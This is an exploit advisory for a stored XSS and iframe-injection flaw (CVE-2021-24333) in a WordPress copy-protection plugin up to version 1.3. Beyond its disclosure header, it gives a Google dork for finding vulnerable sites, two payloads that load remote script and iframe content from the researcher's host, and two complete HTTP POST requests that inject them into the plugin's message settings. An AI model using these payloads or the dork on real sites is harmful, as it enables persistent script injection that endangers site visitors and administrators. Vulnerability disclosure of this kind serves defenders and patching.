/*!
- # VULNERABILITY: Content Copy Protection & Prevent Image Save WordPress Plugin <= 1.3 - Authenticated Persistent XSS & XFS
- # GOOGLE DORK: inurl:/wp-content/plugins/prevent-content-copy-image-save/
- # DATE: 2021-03-29
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Fakhri Alsadi [ https://www.clogica.com ]
- # SOFTWARE VERSION: <= 1.3
- # SOFTWARE LINK: https://wordpress.org/plugins/prevent-content-copy-image-save/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: CVE-2021-24333
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS & XFS vulnerabilities was discovered in the Content Copy Protection & Prevent Image Save plugin through v1.3 for WordPress.

[i] Vulnerable parameter(s): &image_save_msg= and &no_menu_msg=.



### -- [ Impact: ]

[~] Malicious JavaScript code or iFrame injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] "><script src=https://m0ze.ru/payload/a.js></script>

[$] "><iframe src=https://m0ze.ru/payload/xfsii.html></iframe>



### -- [ PoC #1 | Authenticated Persistent XSS & XFS | Image saving disabled message text: ]

[!] POST /wp-admin/options-general.php?page=Prevent_Content_Copy_and_Image_Save.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 228
Cookie: [admin cookies]

select=1&CTRLA=1&CTRLC=1&CTRLX=1&CTRLV=1&CTRLINPUT=1&saveimg=1&image_save_msg=%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fm0ze.ru%2Fpayload%2Fa.js%3E%3C%2Fscript%3E&CTRLS=1&cmenu=1&no_menu_msg=PoC+by+m0ze&Save_Options=++Update+Options++



### -- [ PoC #2 | Authenticated Persistent XSS & XFS | Context menu disabled message text: ]

[!] POST /wp-admin/options-general.php?page=Prevent_Content_Copy_and_Image_Save.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 234
Cookie: [admin cookies]

select=1&CTRLA=1&CTRLC=1&CTRLX=1&CTRLV=1&CTRLINPUT=1&saveimg=1&image_save_msg=PoC+by+m0ze&CTRLS=1&cmenu=1&no_menu_msg=%22%3E%3Ciframe+src%3Dhttps%3A%2F%2Fm0ze.ru%2Fpayload%2Fxfsii.html%3E%3C%2Fiframe%3E&Save_Options=++Update+Options++



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
